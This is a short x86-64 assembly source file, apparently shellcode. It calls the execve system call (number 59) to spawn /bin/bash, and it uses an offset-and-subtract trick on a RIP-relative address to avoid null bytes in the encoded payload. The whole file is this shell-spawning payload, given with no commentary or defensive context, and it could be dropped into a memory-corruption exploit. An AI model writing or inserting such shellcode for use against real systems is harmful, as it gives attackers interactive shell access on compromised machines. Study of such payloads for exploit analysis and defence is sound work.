		.global _start

		.text

_start:
		lea		path+0x4444444(%rip), %rdi
		sub		$0x4444444, %rdi
		mov		$59, %al
		syscall


path:
		.ascii	"/bin/bash"
